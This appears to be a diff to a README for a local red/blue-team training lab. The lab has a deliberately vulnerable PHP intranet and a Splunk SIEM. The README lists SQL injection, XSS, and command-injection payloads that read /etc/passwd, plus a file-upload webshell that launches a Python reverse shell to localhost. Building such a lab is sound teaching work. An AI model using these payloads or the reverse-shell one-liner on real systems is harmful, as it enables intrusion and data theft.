@@ -4,7 +4,7 @@ Welcome to my Red/Blue Enterprise Simulation Lab!
 
 I built this project to simulate a complete cyberattack lifecycle on a single Kali Linux machine. By running this lab, you get to play both sides of the board: you will hack into a vulnerable corporate intranet (Red Team), track your own footprints in a SIEM (Blue Team), and then apply secure code to stop the attacks (Mitigation).
 
-## ⚙️ Prerequisites
+##  Prerequisites
 To run this lab locally, you will need a Kali Linux VM (or any Debian-based Linux distro) with the following installed:
 
 **Apache2 and PHP:**
@@ -19,7 +19,7 @@ SQLite3:
 ```Bash
 sudo apt install sqlite3
 ```
-🚀 How to Run the Lab
+How to Run the Lab
 
 Phase 1: Deploy the Environment
 First, we need to download the code and set up the vulnerable environment and our Splunk SIEM.
@@ -76,16 +76,22 @@ Bypass the ID filter to dump all employee salaries. Put this in the input box:
 
 Plaintext
 1 OR 1=1
+
+
 🔴 2. Cross-Site Scripting (Employee Directory)
 Execute unauthorized JavaScript in the browser. Put this in the search bar:
 
 HTML
 <script>alert("Red Team Compromise!");</script>
+
+
 🔴 3. OS Command Injection (Network Tools)
 Chain commands onto the ping tool to read sensitive system files. Put this in the IP box:
 
 Bash
 127.0.0.1; whoami; pwd; cat /etc/passwd
+
+
 🔴 4. File Upload to Remote Code Execution (Profile Update)
 Upload a malicious PHP file to get a root shell on the server.
 
@@ -107,7 +113,7 @@ Step D: Trigger the shell by copying this exact URL into your browser:
 
 Plaintext
 http://localhost/corpnet/uploads/revshell.php?cmd=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
-
+-------------------------------------------------------------------
 Phase 3: Hunt the Attacker (Blue Team)
 Put on your Incident Responder hat.
 
